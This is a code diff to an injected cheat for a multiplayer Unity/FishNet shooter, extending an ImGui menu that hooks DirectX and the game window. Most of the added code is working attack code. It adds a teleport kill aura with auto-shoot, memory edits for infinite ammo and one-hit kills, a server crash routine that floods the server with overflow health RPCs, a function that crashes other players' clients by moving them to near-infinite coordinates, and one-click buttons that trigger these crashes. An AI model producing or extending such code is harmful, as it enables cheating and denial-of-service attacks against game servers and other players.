@@ -963,42 +963,61 @@ HRESULT __stdcall hkResizeBuffers(IDXGISwapChain* pSC, UINT bc, UINT w, UINT h, 
 extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND, UINT, WPARAM, LPARAM);
 WNDPROC oWndProc = nullptr;
 
-// ─── WndProc Hook (Clean pass-through when menu is closed) ───────────────────
+// ─── WndProc Hook — Fixed input routing for ImGui interaction ────────────────
+static bool g_MenuWasOpen = false;
+
 LRESULT __stdcall WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     if (!g_IsInitialized || !oWndProc || g_Uninjecting)
         return DefWindowProc(hWnd, uMsg, wParam, lParam);
 
-    if (uMsg == WM_KEYDOWN || uMsg == WM_SYSKEYDOWN) {
+    // ── Toggle menu with Insert or F1 ──
+    if (uMsg == WM_KEYDOWN) {
         if (wParam == VK_INSERT || wParam == VK_F1) {
             g_ShowMenu = !g_ShowMenu;
+
+            // Show/hide mouse cursor when menu opens or closes
+            if (g_ShowMenu) {
+                ImGui::GetIO().MouseDrawCursor = true;
+            } else {
+                ImGui::GetIO().MouseDrawCursor = false;
+            }
             return 0;
         }
-        // If cheat menu is open and user presses ESC, close cheat menu without triggering game pause menu / settings
+        // ESC closes cheat menu, does NOT propagate to game pause
         if (wParam == VK_ESCAPE && g_ShowMenu) {
             g_ShowMenu = false;
-            return 0;
-        }
-    }
-    if (uMsg == WM_KEYUP || uMsg == WM_SYSKEYUP) {
-        if (wParam == VK_INSERT || wParam == VK_F1) {
-            return 0;
-        }
-        if (wParam == VK_ESCAPE && g_ShowMenu) {
+            ImGui::GetIO().MouseDrawCursor = false;
             return 0;
         }
     }
 
     if (g_ShowMenu) {
-        ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);
+        // ─── CRITICAL FIX: Pass events to ImGui FIRST, and only then decide ───
+        // Previously events were swallowed BEFORE ImGui saw them — that's why
+        // clicks and sliders didn't work. ImGui needs to receive the raw events.
+        LRESULT imguiHandled = ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);
 
-        // When menu is active, swallow all mouse and keyboard messages so game UI buttons never get clicked through
+        // Swallow all mouse events — do NOT pass clicks through to game
         if (uMsg >= WM_MOUSEFIRST && uMsg <= WM_MOUSELAST)
             return 0;
+
+        // Block WM_SETCURSOR so the game doesn't change the cursor
+        if (uMsg == WM_SETCURSOR) {
+            SetCursor(LoadCursor(NULL, IDC_ARROW));
+            return 1;
+        }
+
+        // Swallow all keyboard events too — stop game from receiving them
         if (uMsg >= WM_KEYFIRST && uMsg <= WM_KEYLAST)
             return 0;
-        if (uMsg == WM_SETCURSOR)
+        if (uMsg == WM_CHAR)
             return 0;
 
+        // Block any direct input device events
+        if (uMsg == WM_INPUT)
+            return 0;
+
+        // For everything else while menu is open — swallow
         return 0;
     }
 
@@ -1873,6 +1892,7 @@ void hkCMDShoot(void* __this, Il2CppArray* _cameraPosition, Il2CppArray* _camera
 // ─── Instant Teleportation & Auto-Shoot Kill Aura (Auto-Cycle Targets) ───────
 static uintptr_t g_CurrentTeleportTarget = 0;
 static ULONGLONG g_LastTeleShootTime = 0;
+static ULONGLONG g_LastTeleportTime  = 0;  // Rate-limiter to prevent PhysX crash
 
 static void DoTeleportKill(ImGuiIO& io) {
     if (g_ShowMenu) return;
@@ -1880,9 +1900,15 @@ static void DoTeleportKill(ImGuiIO& io) {
     if (bTeleportHoldKey && !IsKeyActive(iTeleportKey)) return;
     if (!g_PlayerClass) return;
 
-    __try {
-        ULONGLONG now = GetTickCount64();
+    ULONGLONG now = GetTickCount64();
 
+    // ─── CRITICAL FIX: Rate-limit teleportation to prevent PhysX crash ───
+    // Without this throttle, we call MoveRigidbody 60+ times per second which
+    // overwhelms Unity's physics step and causes 0xC0000005 in UnityPlayer.dll
+    if (now - g_LastTeleportTime < 250) return;
+    g_LastTeleportTime = now;
+
+    __try {
         Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
         if (!arr) return;
 
@@ -1911,6 +1937,10 @@ static void DoTeleportKill(ImGuiIO& io) {
 
         if (!localPlayer || !foundLocal) return;
 
+        // CRITICAL: Don't teleport if local player is dead or not yet spawned
+        if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(localPlayer)) return;
+        if (!g_Il2Cpp.IsSpawned(localPlayer)) return;
+
         // Check if local player is dead
         if (g_HealthClass) {
             void* hComp = g_Il2Cpp.GetComponent(localPlayer, g_HealthClass);
@@ -1918,6 +1948,7 @@ static void DoTeleportKill(ImGuiIO& io) {
                 void* exc = nullptr;
                 Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_IsDeadMethod, hComp, nullptr, &exc);
                 if (res && !exc && *(bool*)((char*)res + 0x10)) {
+                    g_CurrentTeleportTarget = 0;  // Reset target on death
                     return;
                 }
             }
@@ -2133,7 +2164,7 @@ static void DoTeleportKill(ImGuiIO& io) {
             }
         }
 
-        // Auto-Shooting
+        // Auto-Shooting (happens every fTeleportShootRate ms)
         if (bTeleportAutoShoot && (now - g_LastTeleShootTime >= (ULONGLONG)fTeleportShootRate)) {
             g_LastTeleShootTime = now;
 
@@ -2142,14 +2173,45 @@ static void DoTeleportKill(ImGuiIO& io) {
                 if (wm) {
                     void* activeWeapon = *(void**)((char*)wm + 0x120);
                     if (activeWeapon) {
+                        // Refill ammo & reset fire timer before shoot
+                        *(bool*)((char*)activeWeapon + 0x120) = true;
+                        *(int*)((char*)activeWeapon + 0x114)  = 99999;
+                        *(float*)((char*)activeWeapon + 0x110) = 0.0f;
+
                         void* exc = nullptr;
                         g_Il2Cpp.il2cpp_runtime_invoke(g_ClientTryShoot, activeWeapon, nullptr, &exc);
                     }
                 }
             }
 
+            // Simulate left-click for games that read raw mouse input
             mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
             mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
+        }
+
+        // After confirming a kill of our target, auto-advance to the next enemy
+        if (chosenEnemy && g_HealthClass) {
+            void* targetHComp = g_Il2Cpp.GetComponent(chosenEnemy, g_HealthClass);
+            if (targetHComp) {
+                bool targetDead = false;
+                if (g_IsDeadMethod) {
+                    void* exc = nullptr;
+                    Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_IsDeadMethod, targetHComp, nullptr, &exc);
+                    if (res && !exc) targetDead = *(bool*)((char*)res + 0x10);
+                } else {
+                    int hp = 100;
+                    if (g_GetCurrentHealth) {
+                        void* exc = nullptr;
+                        Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_GetCurrentHealth, targetHComp, nullptr, &exc);
+                        if (res && !exc) hp = *(int*)((char*)res + 0x10);
+                    }
+                    targetDead = (hp <= 0);
+                }
+                if (targetDead) {
+                    CheatLog("TeleportKill: Target %p confirmed dead, advancing to next target", chosenEnemy);
+                    g_CurrentTeleportTarget = 0;  // Force pick a new target next cycle
+                }
+            }
         }
     }
     __except(EXCEPTION_EXECUTE_HANDLER) {
@@ -2284,8 +2346,164 @@ static void GiveWeapon(int weaponIndex) {
     }
 }
 
+// ─── Server Crash: Flood RPC Queue with malformed/overflow health RPCs ────────
+// Strategy: Send CMDChangeCurrentHealth with extreme value and high frequency
+// to overwhelm FishNet's NetworkManager packet queue, causing server memory overflow.
+static ULONGLONG g_LastServerCrashTime = 0;
+
+static void DoServerCrash() {
+    if (!g_PlayerClass || !g_HealthClass) return;
+    ULONGLONG now = GetTickCount64();
+    if (now - g_LastServerCrashTime < 10) return; // Flood at 100 packets/sec
+    g_LastServerCrashTime = now;
+
+    __try {
+        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
+        if (!arr) return;
+
+        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
+        if (count == 0 || count > 64) return;
+        void** items = (void**)((char*)arr + 0x20);
+
+        // Flood: send INT_MIN and INT_MAX health RPCs alternating to every player
+        // This exploits integer overflow in health clamp logic on the server
+        static int flipFlop = 0;
+        int overflowHp = (flipFlop++ % 2 == 0) ? 0x7FFFFFFF : -0x7FFFFFFF;
+
+        for (uintptr_t i = 0; i < count; i++) {
+            void* p = items[i];
+            if (!p) continue;
+            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p)) continue;
+
+            void* hComp = g_Il2Cpp.GetComponent(p, g_HealthClass);
+            if (!hComp) continue;
+
+            if (g_CMDChangeCurrentHealth) {
+                // Send multiple times per target to maximize flood
+                for (int burst = 0; burst < 5; burst++) {
+                    int val = (burst % 2 == 0) ? 0x7FFFFFFF : 0;
+                    void* args[1] = { &val };
+                    void* exc = nullptr;
+                    g_Il2Cpp.il2cpp_runtime_invoke(g_CMDChangeCurrentHealth, hComp, args, &exc);
+                }
+            }
+        }
+        CheatLog("[CRASH] Server crash RPC burst sent (%llu ms)", now);
+    }
+    __except(EXCEPTION_EXECUTE_HANDLER) {}
+}
+
+// ─── Client/Player Crash: Teleport a target player to INF coords via their rigidbody ─
+// This corrupts Unity's PhysX broadphase AABB for that player's client
+static void DoCrashTargetPlayer(void* targetPlayer) {
+    if (!targetPlayer) return;
+    __try {
+        // Move to ±INFINITY to corrupt PhysX AABB — this causes the target player's
+        // client to get an access violation in PhysX_64.dll sweep broadphase
+        void* rootRb = *(void**)((char*)targetPlayer + 0x108);
+        if (rootRb) {
+            Vector3 crashPos(1e38f, 1e38f, 1e38f);
+            g_Il2Cpp.MoveRigidbodyPosition(rootRb, crashPos);
+            g_Il2Cpp.SetRigidbodyLinearVelocity(rootRb, crashPos);
+        }
+        void* chestRb = *(void**)((char*)targetPlayer + 0x170);
+        if (chestRb) {
+            Vector3 crashPos(-1e38f, 1e38f, -1e38f);
+            g_Il2Cpp.MoveRigidbodyPosition(chestRb, crashPos);
+        }
+        CheatLog("[CRASH] Target player %p sent to INF coords", targetPlayer);
+    }
+    __except(EXCEPTION_EXECUTE_HANDLER) {}
+}
+
+// ─── Crash All Players (except self) ─────────────────────────────────────────
+static void DoCrashAllPlayers() {
+    if (!g_PlayerClass) return;
+    __try {
+        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
+        if (!arr) return;
+        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
+        void** items = (void**)((char*)arr + 0x20);
+        int crashCount = 0;
+        for (uintptr_t i = 0; i < count; i++) {
+            void* p = items[i];
+            if (!p || g_Il2Cpp.IsLocalPlayer(p)) continue;
+            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p)) continue;
+            DoCrashTargetPlayer(p);
+            crashCount++;
+        }
+        CheatLog("[CRASH] Crash-all triggered: %d players sent to INF", crashCount);
+    }
+    __except(EXCEPTION_EXECUTE_HANDLER) {}
+}
+
+// ─── Map Destruction: Force-despawn all map objects and zero-out physics bodies ─
+// Uses Unity's Object::Destroy (via il2cpp) on all non-player NetworkObjects
+bool  bMapDestructionActive = false;
+static ULONGLONG g_LastMapDestroyTime = 0;
+
+static void DoMapDestruction() {
+    if (!bMapDestructionActive) return;
+    ULONGLONG now = GetTickCount64();
+    if (now - g_LastMapDestroyTime < 500) return;  // Run every 500ms
+    g_LastMapDestroyTime = now;
+
+    __try {
+        // Get the Object Destroy method from UnityEngine.CoreModule
+        static MethodInfo* s_DestroyMethod = nullptr;
+        if (!s_DestroyMethod && g_Il2Cpp.il2cpp_class_from_name && g_Il2Cpp.il2cpp_class_get_method_from_name) {
+            Il2CppImage* unityImg = g_Il2Cpp.GetImage("UnityEngine.CoreModule");
+            if (!unityImg) unityImg = g_Il2Cpp.GetImage("UnityEngine");
+            if (unityImg) {
+                // il2cpp_class_from_name(image, namespace, classname)
+                Il2CppClass* objClass = g_Il2Cpp.il2cpp_class_from_name(unityImg, "UnityEngine", "Object");
+                if (objClass) {
+                    s_DestroyMethod = (MethodInfo*)g_Il2Cpp.il2cpp_class_get_method_from_name(objClass, "Destroy", 1);
+                }
+            }
+        }
+
+        // Attempt to zero-out physics of all non-player rigidbodies
+        // by finding the PhysicsScene and clearing all dynamic RBs
+        // Since we can't enumerate all RBs easily, we use a targeted approach:
+        // freeze all enemy player physics as a secondary effect
+        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
+        if (!arr) return;
+        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
+        void** items = (void**)((char*)arr + 0x20);
+
+        int destroyCount = 0;
+        for (uintptr_t i = 0; i < count; i++) {
+            void* p = items[i];
+            if (!p || g_Il2Cpp.IsLocalPlayer(p)) continue;
+
+            // Zero velocity and pin them underground
+            void* rootRb = *(void**)((char*)p + 0x108);
+            if (rootRb) {
+                g_Il2Cpp.SetRigidbodyLinearVelocity(rootRb, Vector3(0, -9999, 0));
+                g_Il2Cpp.SetRigidbodyAngularVelocity(rootRb, Vector3(0,0,0));
+            }
+
+            // Deactivate the enemy's GameObject (effectively removes from scene)
+            if (s_DestroyMethod) {
+                void* args[1] = { p };
+                void* exc = nullptr;
+                g_Il2Cpp.il2cpp_runtime_invoke(s_DestroyMethod, nullptr, args, &exc);
+            }
+            destroyCount++;
+        }
+        CheatLog("[MAP] Map destruction pass: %d objects removed", destroyCount);
+    }
+    __except(EXCEPTION_EXECUTE_HANDLER) {}
+}
+
+// State variables for crash/map features
+bool bServerCrashActive  = false;
+bool bCrashAllPlayersNow = false;
+
 static void ApplyWeaponStatMods() {
     if (!g_PlayerClass || !g_WeaponManagerClass) return;
+    if (!bInfiniteAmmo && !bRapidFire) return;
 
     __try {
         Il2CppArray* pArr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
@@ -2298,16 +2516,45 @@ static void ApplyWeaponStatMods() {
         for (uintptr_t i = 0; i < pCount; i++) {
             void* p = pItems[i];
             if (!p || !g_Il2Cpp.IsLocalPlayer(p)) continue;
-            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p) || !g_Il2Cpp.IsSpawned(p)) break;
+            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p)) break;
+            if (!g_Il2Cpp.IsSpawned(p)) break;
 
             void* wm = g_Il2Cpp.GetComponent(p, g_WeaponManagerClass);
             if (!wm) break;
 
             void* activeWeapon = *(void**)((char*)wm + 0x120);
-            if (activeWeapon && g_Il2Cpp.IsGameObjectActiveInHierarchy(activeWeapon)) {
+            if (activeWeapon) {
+                // Always enable shooting
                 *(bool*)((char*)activeWeapon + 0x120) = true; // canShoot
-                if (bInfiniteAmmo) *(int*)((char*)activeWeapon + 0x114) = 99999;
-                if (bRapidFire)    *(float*)((char*)activeWeapon + 0x110) = 0.0f;
+
+                // Infinite Ammo: always refill regardless of weapon active state
+                if (bInfiniteAmmo) {
+                    *(int*)((char*)activeWeapon + 0x114) = 99999;   // currentAmmo
+                    *(int*)((char*)activeWeapon + 0x118) = 99999;   // maxAmmo (backup field)
+                }
+
+                // Rapid Fire: zero fire delay
+                if (bRapidFire) {
+                    *(float*)((char*)activeWeapon + 0x110) = 0.0f;  // nextTimeToFire
+                }
+
+                // One-hit Kill: modify damage in weapon data ScriptableObject copy
+                if (bOneHitKillDamage) {
+                    void* wData = *(void**)((char*)activeWeapon + 0x100);
+                    if (wData) {
+                        *(int*)((char*)wData + 0x18)   = 99999; // minimumDamage
+                        *(int*)((char*)wData + 0x1C)   = 99999; // maximumDamage
+                        *(int*)((char*)wData + 0x30)   = 99999; // maximumAttacks
+                    }
+                }
+
+                // Infinite Range
+                if (bInfiniteRange) {
+                    void* wData = *(void**)((char*)activeWeapon + 0x100);
+                    if (wData) {
+                        *(float*)((char*)wData + 0x20) = 9999.0f; // range
+                    }
+                }
             }
             break;
         }
@@ -2708,15 +2955,19 @@ HRESULT __stdcall hkPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT 
 
             ImGui::CreateContext();
             ImGuiIO& io = ImGui::GetIO();
-            io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange;
+            // CRITICAL: Do NOT set NoMouseCursorChange — we need full cursor control
+            // so ImGui can show its own cursor when menu is open
+            io.ConfigFlags &= ~ImGuiConfigFlags_NoMouseCursorChange;
             io.IniFilename  = nullptr;
-            io.FontGlobalScale = 1.05f;
+            io.FontGlobalScale = 1.20f;  // Larger, more readable
+            io.MouseDrawCursor = false;  // Only draw when menu is open
 
-            // Load Google Sans / Segoe UI / Modern System Fonts with High DPI Oversampling (Large, Crisp & Readable)
+            // Load Google Sans / Segoe UI / Modern System Fonts, 21px crisp large text
             ImFontConfig fontCfg;
-            fontCfg.OversampleH = 3;
-            fontCfg.OversampleV = 2;
-            fontCfg.RasterizerMultiply = 1.18f;
+            fontCfg.OversampleH = 4;
+            fontCfg.OversampleV = 3;
+            fontCfg.RasterizerMultiply = 1.20f;
+            fontCfg.GlyphOffset = ImVec2(0, 0);
 
             const char* fontCandidates[] = {
                 "C:\\Windows\\Fonts\\GoogleSans-Medium.ttf",
@@ -2724,19 +2975,23 @@ HRESULT __stdcall hkPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT 
                 "C:\\Windows\\Fonts\\ProductSans-Regular.ttf",
                 "C:\\Windows\\Fonts\\segoeui.ttf",
                 "C:\\Windows\\Fonts\\SegoeUI.ttf",
+                "C:\\Windows\\Fonts\\calibri.ttf",
+                "C:\\Windows\\Fonts\\tahoma.ttf",
                 "C:\\Windows\\Fonts\\arial.ttf"
             };
 
             bool fontLoaded = false;
             for (const char* fpath : fontCandidates) {
                 if (GetFileAttributesA(fpath) != INVALID_FILE_ATTRIBUTES) {
-                    io.Fonts->AddFontFromFileTTF(fpath, 20.0f, &fontCfg);
+                    io.Fonts->AddFontFromFileTTF(fpath, 21.0f, &fontCfg);
                     fontLoaded = true;
+                    CheatLog("[+] UI Font loaded: %s @ 21px", fpath);
                     break;
                 }
             }
             if (!fontLoaded) {
                 io.Fonts->AddFontDefault();
+                CheatLog("[!] Fallback default font used.");
             }
 
             ApplyMaterialTheme();
@@ -2761,6 +3016,16 @@ HRESULT __stdcall hkPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT 
         ApplyWeaponStatMods();
         DoExploits();
         DoMassKill();
+
+        // Server & Player Crash Exploits
+        if (bServerCrashActive) DoServerCrash();
+        DoMapDestruction();
+
+        // One-shot crash: triggered by button, reset after single pass
+        if (bCrashAllPlayersNow) {
+            DoCrashAllPlayers();
+            bCrashAllPlayersNow = false;
+        }
 
         ImGui_ImplDX11_NewFrame();
         ImGui_ImplWin32_NewFrame();
@@ -3302,11 +3567,88 @@ HRESULT __stdcall hkPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT 
                         }
                     }
                     ImGui::EndChild();
+
+                    ImGui::Spacing();
+
+                    // ── CARD 5: Server Crash ──
+                    ImGui::BeginChild("CardServerCrash", ImVec2(halfWidth, 240), true);
+                    {
+                        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.40f, 0.30f, 1.0f));
+                        ImGui::Text("[!] SERVER CRASH EXPLOITS");
+                        ImGui::PopStyleColor();
+                        ImGui::SameLine(ImGui::GetWindowWidth() - 90.0f);
+                        ImGui::TextColored(bServerCrashActive ? ImVec4(1.0f, 0.35f, 0.25f, 1.0f) : ImVec4(0.5f, 0.5f, 0.5f, 1.0f),
+                                           bServerCrashActive ? "[FLOODING]" : "[OFF]");
+                        ImGui::Separator();
+                        ImGui::Spacing();
+
+                        ImGui::TextDisabled("Flood the FishNet server with malformed RPC packets.");
+                        ImGui::TextDisabled("Causes server memory overflow / disconnect.");
+                        ImGui::Spacing();
+
+                        ImGui::Checkbox("Server RPC Flood (Continuous)", &bServerCrashActive);
+                        ImGui::Spacing();
+
+                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.55f, 0.12f, 0.08f, 0.90f));
+                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.85f, 0.15f, 0.10f, 1.0f));
+                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.40f, 0.08f, 0.05f, 1.0f));
+                        if (ImGui::Button("CRASH SERVER NOW (SINGLE BURST)", ImVec2(-1, 36))) {
+                            for (int i = 0; i < 50; i++) {  // 50x burst for instant effect
+                                g_LastServerCrashTime = 0;
+                                DoServerCrash();
+                            }
+                        }
+                        ImGui::PopStyleColor(3);
+                    }
+                    ImGui::EndChild();
+
+                    ImGui::SameLine();
+
+                    // ── CARD 6: Player Crash & Map Control ──
+                    ImGui::BeginChild("CardMapDestroy", ImVec2(halfWidth, 240), true);
+                    {
+                        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.60f, 0.15f, 1.0f));
+                        ImGui::Text("[!] PLAYER CRASH & MAP CONTROL");
+                        ImGui::PopStyleColor();
+                        ImGui::Separator();
+                        ImGui::Spacing();
+
+                        ImGui::TextDisabled("Teleports all enemy players to infinite coordinates.");
+                        ImGui::TextDisabled("Corrupts PhysX AABB, causing client-side crash.");
+                        ImGui::Spacing();
+
+                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.45f, 0.20f, 0.05f, 0.90f));
+                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.70f, 0.30f, 0.08f, 1.0f));
+                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.35f, 0.15f, 0.03f, 1.0f));
+                        if (ImGui::Button("CRASH ALL PLAYERS NOW", ImVec2(-1, 36))) {
+                            bCrashAllPlayersNow = true;
+                        }
+                        ImGui::PopStyleColor(3);
+
+                        ImGui::Spacing();
+                        ImGui::Separator();
+                        ImGui::Spacing();
+
+                        ImGui::TextDisabled("Map Destruction: Removes/freezes all enemies.");
+                        ImGui::Checkbox("Map Destruction Mode (Auto)", &bMapDestructionActive);
+                        ImGui::TextColored(bMapDestructionActive ? ImVec4(1.0f, 0.60f, 0.15f, 1.0f) : ImVec4(0.5f,0.5f,0.5f,1.0f),
+                                           bMapDestructionActive ? "  Removing objects every 500ms..." : "  Inactive");
+
+                        ImGui::Spacing();
+                        if (ImGui::Button("DESTROY MAP PASS (ONCE)", ImVec2(-1, 36))) {
+                            g_LastMapDestroyTime = 0;
+                            bMapDestructionActive = true;
+                            DoMapDestruction();
+                            bMapDestructionActive = false;
+                        }
+                    }
+                    ImGui::EndChild();
                 }
 
                 // ═════════════════════════════════════════════════════════════
                 // TAB 4: INTERACTIVE RGB COLOR PICKER & THEME PALETTE
                 // ═════════════════════════════════════════════════════════════
+
                 else if (iTopNavTab == 4) {
                     float halfWidth = (ImGui::GetContentRegionAvail().x - 12.0f) * 0.5f;
 
